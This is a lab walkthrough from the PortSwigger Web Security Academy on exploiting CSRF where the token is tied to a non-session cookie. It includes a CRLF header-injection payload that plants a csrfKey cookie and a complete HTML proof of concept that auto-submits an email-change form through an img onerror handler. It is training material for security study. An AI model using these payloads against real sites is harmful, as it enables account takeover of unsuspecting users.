# Lab: CSRF where token is tied to non-session cookie

Login with the creds provided and turn on the proxy. Initiate an email address change and intercept the request. Send it to the repeater and observe that changing the csrfKey results in the CSRF token being rejected, while changing the session cookie results in logout.

Login with the other provided creds and initiate an email address change. Intercept the request and replace the csrfKey with the value from the other user. Observe that the request is successful.

Perform a search and send the resulting request to the repeater. Notice that the search term is reflected in the SetCookie header. This can be used to inject cookies into the victim's browser since it implements no CSRF protection: `/?search=something%0d%0aSet-Cookie:%20csrfKey=<value>`

Use the following to trigger the exploit when a victim clicks on the link (the <img> tag contains the cookie setting functionality and is used instead of a script block):

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://ace91f751e85a8eec0141a6900db00af.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="asdf&#64;asdf&#46;com" />
      <input type="hidden" name="csrf" value="g3ePPc9vvaOYqMnYwQ0URmmuwwzHN67o" />
    </form>
    <img src="https://ace91f751e85a8eec0141a6900db00af.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YfAgkgMbjryYgl4WEMKf1qspC6Q93wZS" onerror="document.forms[0].submit()">
  </body>
</html>
```